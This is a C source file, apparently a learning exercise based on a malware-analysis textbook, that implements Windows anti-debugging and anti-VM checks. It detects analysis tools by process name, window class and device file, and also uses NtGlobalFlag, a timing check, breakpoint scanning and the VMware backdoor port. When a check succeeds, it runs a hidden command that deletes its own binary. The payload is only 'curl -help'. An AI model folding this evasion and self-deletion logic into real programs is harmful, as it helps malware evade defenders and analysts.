/*
DO NOT
- build under the unicode
- use this in practice
- change curl option
*/

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>
#include <strsafe.h>
#pragma comment(lib, "user32.lib")
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

//add pma appendixB list of tool
BOOL findProcess()
{
	PROCESSENTRY32  pe = {sizeof(PROCESSENTRY32)};
	HANDLE          ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	BOOL            rslt;

	for (rslt = Process32First(ss, &pe); rslt == TRUE; rslt = Process32Next(ss, &pe)) {
		if(!_stricmp(pe.szExeFile, "Firefox.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "Wireshark.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "apateDNS.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "Autoruns.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "bindiff.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "idaq.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "idaq64.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "Procmon.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "x64dbg.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "x32dbg.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "ollydbg.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "ImmunityDebugger.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "VBoxTray.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "VBoxService.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "msedge.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "chrome.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "VirtualBox.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "javaw.exe")) {
			return TRUE;
		} else if(!_stricmp(pe.szExeFile, "x96dbg.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "idag.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "idaw.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "windbg.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "dnSpy.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "HxD.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "Scylla_x64.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "Scylla_x86.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "regmon.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "procexp.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "procexp64.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "Tcpview.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "smsniff.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "FakeNet.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "netmon.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "PEiD.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "LordPE.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "PE-bear.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "PPEE.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "die.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "diel.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "pexplorer.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "depends.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "ResourceHacker.exe")) {
			return TRUE;
		} else if (!_stricmp(pe.szExeFile, "FileAlyzer2.exe")) {
		    return TRUE;
		} else if (!_stricmp(pe.szExeFile, "processhacker.exe")) {
		    return TRUE;
		} else if (!_stricmp(pe.szExeFile, "Regshot-x64-Unicode.exe")) {
		    return TRUE;
		}
	}
	return FALSE;
}
BOOL CALLBACK findClassName(HWND hwnd, LPARAM lParam)
{
	int cnt;
	char buff[1024];
	char *classNameList[] = { (char *)"PROCMON_WINDOW_CLASS",
		(char *)"OllyDbg",(char *)"TIdaWindow",
		(char *)"WinDbgFrameClass",
		(char *)"FilemonClass",
		(char *)"ID",
		(char *)"RegmonClass",
		(char *)"PROCEXPL",
		(char *)"TCPViewClass",
		(char *)"SmartSniff",
		(char *)"Autoruns",
		(char *)"CNetmonMainFrame",
		(char *)"TFormFileAlyzer2",
		(char *)"ProcessHacker"
	}; //add more class name
	if (GetClassName(hwnd, buff, sizeof(buff))) {
		for (cnt = 0; cnt < sizeof(classNameList) / sizeof(wchar_t *); cnt++) {
			if (!_stricmp(classNameList[cnt], buff)) {
				return TRUE;
			}
		}
	}
	return FALSE;
}
BOOL detect_Devicefile()
{
	int    cnt;
	HANDLE rslt;
	char *fnameList[] = {
		(char*)"\\\\.\\Global\\ProcmonDebugLogger",
		(char*)"\\\\.\\SICE",
		(char*)"\\\\.\\NTICE",
		(char*)"\\\\.\\SIWDEBUG",
		(char*)"\\\\.\\SIWVID",
		(char*)"\\\\.\\FILEMON",
		(char*)"\\\\.\\Global\\FILEMON",
		(char*)"\\\\.\\REGMON",
		(char*)"\\\\.\\Global\\REGMON",
		(char*)"\\\\.\\FILEVXD.VXD",
		(char*)"\\\\.\\REGVXD.VXD",
		(char*)"\\\\.\\TRW",
		(char*)"\\\\.\\TRWDEBUG",
		(char*)"\\\\.\\IceExt",
		(char*)"\\\\.\\RvtracerDevice0",
		(char*)"\\\\.\\BW2K",
		(char*)"\\\\.\\SUPERBPM",
		(char*)"\\\\.\\NTICED052",
		(char*)"\\\\.\\NTICE7871",
		(char*)"\\\\.\\TRW2000",
		(char*)"\\\\.\\VKEYPROD"
	};
	for (cnt = 0; cnt < sizeof(fnameList) / sizeof(char *); cnt++) {
		rslt = CreateFile(fnameList[cnt],
			GENERIC_READ,
			FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			0);
		if (rslt == INVALID_HANDLE_VALUE) {
			return FALSE;
		}
		else {
			CloseHandle(rslt);
			return TRUE;
		}
	}
}
__declspec(naked) DWORD getNtGlobalFlag()
{
	__asm {
		mov eax, fs: [0x18]
		mov eax, [eax + 0x30]
		mov eax, [eax + 0x68]
		ret
	}
}
UCHAR checkVMware1()
{
	UCHAR rslt = 0;
	__try {
		__asm {
			push edx
			push ecx
			push ebx
			mov  eax, 'VMXh'
			mov  ebx, 0
			mov  ecx, 10
			mov  edx, 'VX'
			in   eax, dx
			cmp  ebx, 'VMXh'
			setz [rslt]
			pop  ebx
			pop  ecx
			pop  edx
		}
	}__except (EXCEPTION_EXECUTE_HANDLER) {
	}
	return rslt;
}
UCHAR checkVMware2()
{
	UCHAR rslt = 0;
	__try {
		__asm {
			push edx
			push ecx
			push ebx
			mov  eax, 'VMXh'
			mov  ebx, 0
			mov  ecx, 10
			mov  edx, 'VX'
			in   eax, dx
			pop  ebx
			pop  ecx
			pop  edx
		}
	}__except (EXCEPTION_EXECUTE_HANDLER) {
		return 0;
	}
	return 1;
}
void do_or_die() {
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	exit(0);
}

int main() {

	DWORD startTime = GetTickCount64();

	if (findProcess()) {
		do_or_die();
	}
	if (EnumWindows(findClassName, 0)) {
		do_or_die();
	}
	if (detect_Devicefile()) {
		do_or_die();
	}
	if (GetTickCount64() - startTime > 5000) {
		do_or_die();
	}
	if (IsDebuggerPresent()) {
		do_or_die();
	}
	if (getNtGlobalFlag() == 0x70) {
		do_or_die();
	}
	BOOL present;
	CheckRemoteDebuggerPresent(GetCurrentProcess(), &present);
	if (present) {
		do_or_die();
	}
	if (checkVMware1()) {
		do_or_die();
	}
	if (checkVMware2()) {
		do_or_die();
	}
	if (*(UCHAR*)findProcess == 0xCC) {
		do_or_die();
	}
	if (*(UCHAR*)detect_Devicefile == 0xCC) {
		do_or_die();
	}
	if (*(UCHAR*)checkVMware1 == 0xCC) {
		do_or_die();
	}
	if (*(UCHAR*)checkVMware2 == 0xCC) {
		do_or_die();
	}

	system("curl -help");

	return 0;
}